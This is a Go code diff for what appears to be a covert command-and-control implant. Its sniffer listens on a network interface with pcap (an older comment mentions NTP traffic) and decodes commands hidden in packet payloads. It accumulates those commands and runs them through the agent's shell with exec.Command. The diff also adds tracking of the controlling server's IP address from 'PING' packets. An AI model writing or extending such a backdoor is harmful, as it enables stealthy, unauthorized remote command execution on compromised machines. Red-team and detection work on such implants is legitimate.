@@ -14,8 +14,6 @@ import (
 	"github.com/google/gopacket/pcap"
 )
 
-//sniff for NTP traffic
-//buffer?
 
 func StartSniffer(newAgent agent.Agent) {
 	msg := ""
@@ -29,30 +27,27 @@ func StartSniffer(newAgent agent.Agent) {
 		)
 
 		handler, err := pcap.OpenLive(iface, buffer, false, pcap.BlockForever)
-		if err != nil {
-			log.Fatal(err)
-		}
+		if err != nil { log.Fatal(err) }
 
 		defer handler.Close()
 
-		if err := handler.SetBPFFilter(filter); err != nil {
-			log.Fatal(err)
-		}
+		if err := handler.SetBPFFilter(filter); err != nil { log.Fatal(err) }
 
 		source := gopacket.NewPacketSource(handler, handler.LinkType())
 		for packet := range source.Packets() {
 			ret, cont := harvestInfo(packet)
-			if ret != "ignore" {
-				msg += ret
-			}
+			if strings.Contains(cont, "COM") { msg += ret } 
+
 			if cont == "COMD" {
 				runCommand(msg, newAgent)
 				msg = ""
 			} else if cont == "KILL" {
 				//start shutdown
-			} else if cont == "PING" {
-				//resync
-			} else if cont == "ignore" {
+			} else if cont == "PING" { //resync
+				newAgent.ServerIP = []byte(ret)
+				fmt.Println("serverip: ", newAgent.ServerIP)
+				//fmt.Println(newAgent.ServerIP)
+			} else {
 				continue
 			}
 		}
@@ -61,11 +56,12 @@ func StartSniffer(newAgent agent.Agent) {
 }
 
 func harvestInfo(packet gopacket.Packet) (string, string) {
+	ipLayer := packet.NetworkLayer()
+	ipLayerBytes := ipLayer.LayerContents()
+	srcIP := ipLayer.LayerContents()[len(ipLayerBytes)-8:len(ipLayerBytes)-4]
 	app := packet.ApplicationLayer()
 	if app != nil {
-		fmt.Println(app.LayerContents())
 		final := decode(app.LayerContents())
-		fmt.Println(final)
 		index := strings.Index(final, "COM")
 		if strings.Contains(final, "COMU") {
 			return final[index+4:], "COMU"
@@ -74,11 +70,12 @@ func harvestInfo(packet gopacket.Packet) (string, string) {
 		} else if strings.Contains(final, "KILL") {
 			return "", "KILL"
 		} else if strings.Contains(final, "PING") {
-			return "", "PING" //TODO server auto pings agent if goes to MIA, hoping for change response
+			return string(srcIP), "PING" //TODO server auto pings agent if goes to MIA, hoping for change response
 		}
 	}
 	return "ignore", "ignore"
 }
+
 
 func runCommand(msg string, newAgent agent.Agent) {
 	output, err := exec.Command(newAgent.ShellType, newAgent.ShellFlag, msg).Output()
